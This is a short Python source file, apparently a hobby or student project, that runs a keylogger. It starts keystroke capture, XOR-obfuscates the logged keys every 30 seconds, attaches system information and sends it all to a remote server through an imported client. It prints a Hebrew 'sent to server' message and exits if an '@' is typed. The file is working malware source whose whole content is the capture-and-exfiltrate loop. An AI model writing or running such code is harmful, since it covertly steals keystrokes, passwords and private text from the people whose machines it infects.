from EncryptedXor import EncryptedXor
from KeyLoggerService import KeyLoggerService
from clientSide import SendData
from datetime import datetime
import time


class KeyLoggerMenger:
      def __init__(self):
          self.start=KeyLoggerService()
          self.send_client=SendData()
          self.TIME=30
          self.xor = EncryptedXor()


      def start_to_programe(self):
          key="abc"
          self.start.start_logging()

          while True:
               time.sleep(self.TIME)
               text =''.join(self.start.get_logged_keys())

               if '@' in text:
                   exit()

               xor=self.xor.xor_encrypt_decrypt(text,key)
               now=datetime.now()
               data_for_system=self.start.system_information()
               self.send_client.send_to_server({"time":now.strftime('%d/%m/%Y %H:%M:%S'),"data":xor,"system":data_for_system})
               print("נשלח לשרת...")
               self.start.data.clear()


s=KeyLoggerMenger()
s.start_to_programe()



